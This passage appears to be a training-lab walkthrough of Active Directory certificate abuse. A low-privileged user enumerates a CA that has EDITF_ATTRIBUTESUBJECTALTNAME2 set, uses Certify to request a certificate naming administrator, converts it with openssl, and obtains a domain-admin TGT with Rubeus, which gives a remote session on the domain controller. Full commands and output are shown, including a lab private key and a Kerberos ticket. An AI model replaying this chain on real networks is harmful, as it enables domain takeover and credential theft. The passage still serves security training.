- Enumerate the CA for the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute.
```
PS C:\AD\MyTools> .\Certify.exe cas

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local


[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local

[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        CA-Integration
        HTTPSCertificates
        SmartCardEnrollment-Users
        SmartCardEnrollment-Agent
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator





Certify completed in 00:00:32.5369887
```

- Request a certificate for ANY user from a template that allows enrollment for normal/low-privileged users.
```
PS C:\AD\MyTools> .\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student303
[*] No subject name specified, using current context as subject.

[*] Template                : CA-Integration
[*] Subject                 : CN=student303, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 26

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxTYtstdzaLn0AK/u/bd9/aIVDM7DIYwGITc8GxGGgQ1DZqK9
Nu85HJdicAfL204cdhGAGU9KmttTawt13TeQNPLXLud4BERtbeY4eaUEl2rKsu+R
AhefylRtJ/qqPskADg9NofK9ism2yNTtp11xMU+EdOpFfSeQU5Gj2bQozGmyyMU0
HTujWybyMZWw8qPz5hE+u/Phqi++vmdj9I5riCQajGm1E2b4oKBTrkIbfUmx7f8d
oTIvfpoUsb3TNgYyJrAgui1/NbghXCEK4VEvT41uMqyx4mpONuINeq+HBPPJbsx8
t7dlQMAA63KFNoIkY9hUfSmERa4wSkP89odfyQIDAQABAoIBAFSjhwNtgmOdA0LU
Py729ITJbl1b09VvAiZ5TTuUzvROG/JNwAV2sD08H4xTXEOYB5EIu8ChDjTeErQr
a/9wXFzNKFtCDnlOYOS83NogX5MYyzv2o3aRawvsJhj1dOGTZImkOb5arsyE/AS/
leuxp+Xw6bk/3mjzdPbY18iUkLoBlkmn88QeFT53G+IbQP54S5gjY3flJtBXvwRD
MDWOPP8j0qC6fIehuIEOfPiNm1EjNFiAVMxXgSWOOb6wZMa6NRqqVCjli/I9p5AO
OtndxbUZQMqrLoxCvPQUbUdTlLKWqr8M8acXKZjPygaeq+uyljs/eLiDR9Nrbuap
B8qvm70CgYEA5PqqfGEt3RYCCy49aixStwNUyL2xLU3n/Qa6NZzixHRuksVfOYOl
Wx2S0Ly9oGj35K+Vtw6PpmCkTlCGVJBGHIPpgsFKpOZ7FJjPkFInyzYjYlT38pAT
Q9BfAjXB36ifhAmp9yILcEQplUO+oBk8Per2VwXhUAbtJVE2LRKGMksCgYEA3HvV
Qn8ewTa3BmcGJuvzIIDGrSxotM1MboBv6f3xcEE395gtB6bj5lFEaXVpipKUuKGj
2SfOlTG8ASY/FMkzfCORe9IwXPuW66waH7KEAEY9Z3S15GW98OrtX9yNgSaUwLAE
Lgue5ikSk5t2vuS6vON7rfkSC+/eTS+cAs60CbsCgYAw2Dfd6Gz8KGGvOOHo8COE
3rULTUuqOmAuXW0DWsAU4DFmJaw2fJqdYSWcWWap/TpEEiCBuB10hFEIU60UBOKv
2oPJXKormu7Oafp88smCU74gj7eEiq9RW/WoZwdASpwccmNLUHvYKvIj4Ruc00VC
gAikb6CsjY2w1C4WV0lBGQKBgHEW90DfURgLh386MraeCZufUcibYa1zLAP1zvF3
NnK8kQdnP5mQKY8GGg/5kEPqgWveRNtqhpSR6Pux8WMo/EZtO/8FxZa72SJSqSee
+gPmAzLgczeOVAmRhmXIC7C16FCZN9uiTEODx6p8cEDjs0CVcee/PFlxFFYE2IG8
Ii5nAoGAR+KJswH+D0KkHxp+HUAgzBdIi0zlCmm5v2zwh2ZDWlqVtEhgZRjXPmNu
XSVv5qBWrNJrR3dr1jdv6/meJWg+tDd417Z7QaQIHBw1u8nEP7/N4BFmVdB9hatA
rS5nk+8gNTzhM5nuVFCox+Ss3TyKmXZifnoE3mDu6loEBlS8ToM=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGsTCCBZmgAwIBAgITFQAAABpuh3YQL3cYHwAAAAAAGjANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA4MDkw
ODI2MjlaFw0yNDA4MDgwODI2MjlaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50MzAzMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxTYtstdzaLn0AK/u/bd9/aIVDM7D
IYwGITc8GxGGgQ1DZqK9Nu85HJdicAfL204cdhGAGU9KmttTawt13TeQNPLXLud4
BERtbeY4eaUEl2rKsu+RAhefylRtJ/qqPskADg9NofK9ism2yNTtp11xMU+EdOpF
fSeQU5Gj2bQozGmyyMU0HTujWybyMZWw8qPz5hE+u/Phqi++vmdj9I5riCQajGm1
E2b4oKBTrkIbfUmx7f8doTIvfpoUsb3TNgYyJrAgui1/NbghXCEK4VEvT41uMqyx
4mpONuINeq+HBPPJbsx8t7dlQMAA63KFNoIkY9hUfSmERa4wSkP89odfyQIDAQAB
o4IDXTCCA1kwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/gsD8U/nBbgIBZAIBDDApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYB
BQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQo
MCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG
9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4D
AgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFG9tZscq5q+8qQfFF/cByiX81Bm0MCgG
A1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1UdIwQY
MBaAFNH+jQqn+rQynzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSG
gcFsZGFwOi8vL0NOPW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxD
Tj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVS
ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
aW50MIHLBggrBgEFBQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NO
PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIw
U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNv
cnAsREM9bG9jYWw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
ZmljYXRpb25BdXRob3JpdHkwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIB
oC8ELVMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2NDgtNDEw
MzANBgkqhkiG9w0BAQsFAAOCAQEAtZIDVOR+kyCGtGMZlw0N45kRdPhVVhqkbb01
bpWg4NGJiinrA7udJNb0dYogQobVe+8rBIH6Yc/2RRnQUC5FDCKy6hlpk16iQJzm
2kqfyGh5EP0276Hk6ZB0TURL5GyOiyrdhcnvK6x3w+/wpDucMY/N8ECPBY6tXx+n
ykjPU0Tt346/4qaAkCo8OP+W58rHLUhEZRXurdhQalLQUBaUXeqTQYW1sJW0gpWW
ivSypUKB5cdHv1vUA6FOSr75DTjH324kYpGUg+u2z80lPbbTyE5g7AzLfwCg/uXo
N6OwUPLDnP0z95pFkoeyYT9feNUsmZR6dClc0xp+1YxZgo3YGg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- Copy the whole `cert.pem` text, place it to a file `Administrator.pem` and transfer it to a Linux machine.

- Run the following command to convert the certificate to a `.pfx` one (use a null password).
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# openssl pkcs12 -in Administrator.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out Administrator.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

- Use the `Administrator.pfx` certificate to request a TGT on behalf of `dcorp\administrator`.
```
  PS C:\AD\MyTools> .\Rubeus.exe asktgt /user:Administrator /certificate:Administrator.pfx /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=student303, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\Administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  8/9/2023 12:39:46 AM
  EndTime                  :  8/9/2023 10:39:46 AM
  RenewTill                :  8/16/2023 12:39:46 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  woyY2zLqfWRCFkH93JHTIQ==
  ASREP (key)              :  ED7B9308B993D19B94661F69EA0220B0

PS C:\AD\MyTools> klist

Current LogonId is 0:0x45724cc

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/9/2023 0:39:46 (local)
        End Time:   8/9/2023 10:39:46 (local)
        Renew Time: 8/16/2023 0:39:46 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami
dcorp\administrator
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
dcorp-dc
